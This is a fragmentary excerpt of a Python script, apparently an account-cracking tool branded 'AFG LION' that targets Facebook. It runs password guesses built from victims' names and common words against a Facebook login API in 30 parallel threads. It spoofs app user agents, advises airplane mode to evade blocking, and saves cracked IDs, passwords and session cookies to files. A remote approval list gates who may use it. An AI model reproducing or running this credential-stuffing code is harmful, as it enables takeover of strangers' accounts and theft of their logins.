...
os.system('echo -e "\e]0;LION TOOL ðŸ”¥\a"')
try:
    import httpx
except:
...
from pathlib import Path
import os,base64,zlib,pip,urllib,sys,time,platform,pip,uuid,subprocess
print('\n [âˆš] Join my WhatsApp Group for new updates...!')
...
def file_crack():
	...
	if jsj == '1':
		...
		if igh == '1':
			...
			plist.append('first@last')
			plist.append('afghanistan')
			plist.append('pakistan')
			plist.append('malik12345')
			plist.append('600700')
		elif igh == '2':
	...
	with tred(max_workers=30) as ARNAV:
		...
		print('\033[1;37m Use airplane mode For best Result')
		linex()
		for user in fo:
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m [AFG LION]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
...
'Content-Length': '2126'}
			...
			if 'session_key' in po:
					...
					print('\r\r\033[1;32m |AFG LION-OK| '+uid+' | '+pas)
					print('\r\r \033[1;35m|ðŸª|=> : '+coki)
					file_path = os.path.join(folder_path, 'AFG LION_FILE_OK.txt')
					...
					print(f'\r\r\33[1m\33[1;35m |AFG LION-CP| '+uid+' | '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path, 'AFG LION-CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
					break
...
def apvdef():
   ...
   b=str(os.getlogin())
   y="".join(a+b)
   key=f"ARNAV INXIDE {y} âœ“"
   row=httpx.get("https://github.com/afglion5/approval/blob/main/approval.txt").text
   if key in row:
     Main_ARNAV()
   else:
     os.system("clear")
